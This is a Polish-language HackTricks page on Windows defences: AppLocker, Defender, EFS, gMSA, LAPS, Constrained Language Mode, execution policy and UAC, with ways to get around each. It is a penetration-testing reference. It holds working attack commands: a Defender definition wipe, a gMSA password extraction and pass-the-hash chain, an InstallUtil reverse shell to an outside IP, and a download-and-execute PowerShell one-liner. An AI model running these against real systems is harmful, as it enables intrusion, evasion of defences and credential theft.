# Mechanizmy zabezpieczeń Windows

{{#include ../../banners/hacktricks-training.md}}

## Zasady AppLocker

Biała lista aplikacji to lista zatwierdzonych aplikacji lub plików wykonywalnych, które mogą znajdować się w systemie i być w nim uruchamiane. Jej celem jest ochrona środowiska przed szkodliwym malware i niezatwierdzonym oprogramowaniem, które nie odpowiada konkretnym potrzebom biznesowym organizacji.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) to **rozwiązanie Microsoft do tworzenia białych list aplikacji**, które zapewnia administratorom systemów kontrolę nad tym, **które aplikacje i pliki mogą uruchamiać użytkownicy**. Zapewnia **szczegółową kontrolę** nad plikami wykonywalnymi, skryptami, plikami instalatora Windows, bibliotekami DLL, aplikacjami w pakietach i instalatorami aplikacji w pakietach.\
Organizacje często **blokują cmd.exe i PowerShell.exe** oraz możliwość zapisu w określonych katalogach, **ale można to wszystko obejść**.

### Sprawdzenie

Sprawdź, które pliki/rozszerzenia znajdują się na czarnej/białej liście:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ta ścieżka rejestru zawiera konfiguracje i zasady stosowane przez AppLocker, umożliwiając przegląd aktualnego zestawu reguł wymuszanych w systemie:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Przydatne **zapisywalne foldery** do ominięcia AppLocker Policy: Jeśli AppLocker zezwala na wykonywanie czegokolwiek wewnątrz `C:\Windows\System32` lub `C:\Windows`, istnieją **zapisywalne foldery**, których można użyć, aby **obejść te zasady**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Powszechnie **zaufane** binaria [**„LOLBAS”**](https://lolbas-project.github.io/) mogą być również przydatne do ominięcia AppLocker.
- **Nieprawidłowo napisane reguły również mogą zostać ominięte**
- Na przykład w przypadku **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** można utworzyć **folder o nazwie `allowed`** w dowolnym miejscu, a będzie on dozwolony.
- Organizacje często koncentrują się również na **blokowaniu pliku wykonywalnego `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ale zapominają o **innych** [**lokalizacjach plików wykonywalnych PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), takich jak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` lub `PowerShell_ISE.exe`.
- **Wymuszanie DLL jest bardzo rzadko włączane** ze względu na dodatkowe obciążenie systemu oraz ilość testów wymaganych do zagwarantowania, że nic nie przestanie działać. Dlatego używanie **DLL jako backdoorów pomoże ominąć AppLocker**.
- Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonywać kod Powershell** w dowolnym procesie i ominąć AppLocker. Więcej informacji znajdziesz tutaj: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Magazyn poświadczeń

### Security Accounts Manager (SAM)

Lokalne poświadczenia znajdują się w tym pliku, a hasła są zahashowane.

### Local Security Authority (LSA) - LSASS

**Poświadczenia** (zahashowane) są **zapisywane** w **pamięci** tego podsystemu ze względu na Single Sign-On.\
**LSA** administruje lokalną **polityką bezpieczeństwa** (polityką haseł, uprawnieniami użytkowników...), **uwierzytelnianiem**, **tokenami dostępu**...\
LSA będzie odpowiedzialna za **sprawdzenie** podanych poświadczeń w pliku **SAM** (w przypadku logowania lokalnego) oraz za **komunikację** z **kontrolerem domeny** w celu uwierzytelnienia użytkownika domenowego.

**Poświadczenia** są **zapisywane** wewnątrz **procesu LSASS**: bilety Kerberos, hashe NT i LM oraz łatwe do odszyfrowania hasła.

### Sekrety LSA

LSA może zapisywać na dysku niektóre poświadczenia:

- Hasło konta komputera w Active Directory (niedostępny kontroler domeny).
- Hasła kont usług Windows
- Hasła zadań zaplanowanych
- Więcej (hasła aplikacji IIS...)

### NTDS.dit

Jest to baza danych Active Directory. Występuje tylko na kontrolerach domeny.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) to Antivirus dostępny w Windows 10, Windows 11 oraz wersjach Windows Server. **Blokuje** popularne narzędzia pentestingowe, takie jak **`WinPEAS`**. Istnieją jednak sposoby na **ominięcie tych zabezpieczeń**.

### Sprawdzanie

Aby sprawdzić **status** programu **Defender**, możesz wykonać cmdlet PS **`Get-MpComputerStatus`** (sprawdź wartość **`RealTimeProtectionEnabled`**, aby dowiedzieć się, czy jest aktywny):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Możesz również uruchomić następujące polecenie, aby go wyliczyć:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Szyfrowany system plików (EFS)

EFS zabezpiecza pliki za pomocą szyfrowania, wykorzystując **klucz symetryczny** znany jako **File Encryption Key (FEK)**. Ten klucz jest szyfrowany za pomocą **klucza publicznego** użytkownika i przechowywany w **alternatywnym strumieniu danych** $EFS zaszyfrowanego pliku. Gdy wymagane jest odszyfrowanie, odpowiadający mu **klucz prywatny** certyfikatu cyfrowego użytkownika służy do odszyfrowania FEK ze strumienia $EFS. Więcej informacji można znaleźć [tutaj](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenariusze odszyfrowywania bez inicjowania przez użytkownika** obejmują:

- Gdy pliki lub foldery są przenoszone do systemu plików, który nie obsługuje EFS, takiego jak [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), są automatycznie odszyfrowywane.
- Zaszyfrowane pliki wysyłane przez sieć za pośrednictwem protokołu SMB/CIFS są odszyfrowywane przed transmisją.

Ta metoda szyfrowania zapewnia właścicielowi **transparentny dostęp** do zaszyfrowanych plików. Jednak samo zmienienie hasła właściciela i zalogowanie się nie umożliwi ich odszyfrowania.

**Najważniejsze informacje**:

- EFS używa symetrycznego FEK, szyfrowanego za pomocą klucza publicznego użytkownika.
- Odszyfrowywanie wykorzystuje klucz prywatny użytkownika w celu uzyskania dostępu do FEK.
- Automatyczne odszyfrowywanie odbywa się w określonych warunkach, takich jak kopiowanie do FAT32 lub transmisja przez sieć.
- Właściciel może uzyskać dostęp do zaszyfrowanych plików bez wykonywania dodatkowych czynności.

### Sprawdzanie informacji EFS

Sprawdź, czy **użytkownik** **korzystał** z tej **usługi**, sprawdzając, czy istnieje ta ścieżka:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Sprawdź, **kto** ma **dostęp** do pliku, używając cipher /c \<file>\
Możesz również użyć `cipher /e` i `cipher /d` wewnątrz folderu, aby **zaszyfrować** i **odszyfrować** wszystkie pliki

### Odszyfrowywanie plików EFS

#### Being Authority System

Ta metoda wymaga, aby **użytkownik będący ofiarą** miał **uruchomiony** **proces** na hoście. Jeśli tak jest, używając sesji `meterpreter`, możesz podszyć się pod token procesu użytkownika (`impersonate_token` z `incognito`). Możesz również po prostu wykonać `migrate` do procesu użytkownika.

#### Znajomość hasła użytkownika

Mimikatz opisuje, jak zaimportować materiał certyfikatu/klucza prywatnego użytkownika i odszyfrować pliki chronione przez EFS, gdy hasło jest znane.<sup>[[6]](#references)</sup>

## Grupowo zarządzane konta usług (gMSA)

Firma Microsoft opracowała **Group Managed Service Accounts (gMSA)**, aby uprościć zarządzanie kontami usług w infrastrukturach IT. W przeciwieństwie do tradycyjnych kont usług, w przypadku których często włączone jest ustawienie "**Password never expire**", gMSA oferują bezpieczniejsze i łatwiejsze w zarządzaniu rozwiązanie:

- **Automatyczne zarządzanie hasłami**: gMSA używają złożonego, 240-znakowego hasła, które jest automatycznie zmieniane zgodnie z zasadami domeny lub komputera. Proces ten jest obsługiwany przez usługę Microsoft Key Distribution Service (KDC), co eliminuje konieczność ręcznej aktualizacji haseł.
- **Zwiększone bezpieczeństwo**: Te konta są odporne na blokady i nie mogą być używane do logowania interaktywnego, co zwiększa ich bezpieczeństwo.
- **Obsługa wielu hostów**: gMSA mogą być współdzielone między wieloma hostami, dzięki czemu idealnie nadają się do usług uruchomionych na wielu serwerach.
- **Obsługa zadań zaplanowanych**: W przeciwieństwie do managed service accounts, gMSA obsługują uruchamianie zadań zaplanowanych.
- **Uproszczone zarządzanie SPN**: System automatycznie aktualizuje Service Principal Name (SPN), gdy zmieniają się dane sAMaccount lub nazwa DNS komputera, co upraszcza zarządzanie SPN.

Hasła gMSA są przechowywane we właściwości LDAP _**msDS-ManagedPassword**_ i automatycznie resetowane co 30 dni przez kontrolery domeny (DC). Hasło to, będące zaszyfrowanym blokiem danych znanym jako [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), może być pobierane wyłącznie przez upoważnionych administratorów oraz serwery, na których zainstalowano gMSA, co zapewnia bezpieczne środowisko. Aby uzyskać dostęp do tych informacji, wymagane jest zabezpieczone połączenie, takie jak LDAPS, lub połączenie musi być uwierzytelnione za pomocą „Sealing & Secure”.

![Przekazywanie uwierzytelniania NTLM w celu pobrania hasła gMSA](../../images/asd1.png)<sup>[[1]](#references)</sup>

To hasło można odczytać za pomocą [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**Znajdź więcej informacji w zarchiwizowanych, oryginalnych materiałach badawczych**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

Te same badania wyjaśniają, jak **NTLM relay attack** może uzyskać **hasło gMSA**, gdy relayed principal ma uprawnienia do odczytu `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Wykorzystanie łańcuchowania ACL do odczytu zarządzanego hasła gMSA (GenericAll -> ReadGMSAPassword)

W wielu środowiskach użytkownicy o niskich uprawnieniach mogą uzyskać dostęp do sekretów gMSA bez kompromitowania DC, wykorzystując nieprawidłowo skonfigurowane ACL obiektów:<sup>[[3]](#references)</sup>

- Grupie, którą możesz kontrolować (np. za pomocą GenericAll/GenericWrite), przyznano `ReadGMSAPassword` względem gMSA.
- Dodając siebie do tej grupy, dziedziczysz uprawnienie do odczytu bloku `msDS-ManagedPassword` gMSA przez LDAP i możesz uzyskać użyteczne poświadczenia NTLM.

Typowy przebieg:

1) Znajdź ścieżkę za pomocą BloodHound i oznacz swoje principals uzyskujące dostęp jako Owned. Szukaj krawędzi takich jak:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Dodaj siebie do kontrolowanej przez siebie grupy pośredniej (przykład z bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Odczytaj zarządzane hasło gMSA przez LDAP i wyprowadź hash NTLM. NetExec automatyzuje ekstrakcję `msDS-ManagedPassword` i konwersję do NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Uwierzytelnij się jako gMSA przy użyciu hasha NTLM (tekst jawny nie jest potrzebny). Jeśli konto należy do grupy Remote Management Users, WinRM zadziała bezpośrednio:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notes:
- Odczyty LDAP wartości `msDS-ManagedPassword` wymagają sealing (np. LDAPS/sign+seal). Tools obsługują to automatycznie.
- gMSAs często otrzymują lokalne uprawnienia, takie jak WinRM; sprawdź członkostwo w grupach (np. Remote Management Users), aby zaplanować lateral movement.
- Jeśli potrzebujesz bloba tylko do samodzielnego obliczenia NTLM, zobacz strukturę MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

**Local Administrator Password Solution (LAPS)**, dostępne do pobrania na stronie [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), umożliwia zarządzanie hasłami lokalnego Administratora. Hasła te, które są **randomizowane**, unikalne i **regularnie zmieniane**, są przechowywane centralnie w Active Directory. Dostęp do tych haseł jest ograniczony za pomocą ACL do autoryzowanych użytkowników. Po przyznaniu wystarczających uprawnień możliwy jest odczyt haseł lokalnego administratora.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **blokuje wiele funkcji** potrzebnych do efektywnego korzystania z PowerShell, takich jak blokowanie obiektów COM, zezwalanie wyłącznie na zatwierdzone typy .NET, workflows oparte na XAML, klasy PowerShell i inne.

### **Sprawdź**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
W aktualnych wersjach Windows ten bypass już nie działa, ale możesz użyć [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Aby go skompilować, może być konieczne** _**Add a Reference**_ -> _Browse_ -> _Browse_ -> dodanie `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` oraz **zmiana projektu na .Net4.5**.

#### Bezpośredni bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonywać** kod Powershell w dowolnym procesie i ominąć tryb ograniczony. Więcej informacji znajdziesz tutaj: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Zasady wykonywania PS

Domyślnie jest ustawiona wartość **restricted**. Główne sposoby obejścia tej zasady:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Więcej informacji można znaleźć [tutaj](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

Jest to API, którego można używać do uwierzytelniania użytkowników.

SSPI wybiera odpowiedni protokół uwierzytelniania dla dwóch komunikujących się maszyn, preferując Kerberos, gdy jest dostępny. Protokoły te są implementowane przez Security Support Providers (SSP), które są instalowane w systemie Windows jako biblioteki DLL; obie strony muszą obsługiwać wybranego dostawcę.

### Główne SSP

- **Kerberos**: Preferowany
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** i **NTLMv2**: Ze względu na kompatybilność
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Serwery internetowe i LDAP, hasło w postaci hasha MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Służy do negocjowania używanego protokołu (Kerberos lub NTLM, przy czym Kerberos jest domyślny)
- %windir%\Windows\System32\lsasrv.dll

#### Negocjacja może oferować kilka metod lub tylko jedną.

## UAC - Kontrola kont użytkowników

[Kontrola kont użytkowników (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja umożliwiająca **wyświetlanie monitu o zgodę na działania wymagające podwyższonych uprawnień**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0 (Archiwum Internetu)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA przez łańcuchowanie uprawnień do WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Omijanie AppLocker i PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 sposobów na obejście PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ odszyfrowywanie plików EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
{{#include ../../banners/hacktricks-training.md}}
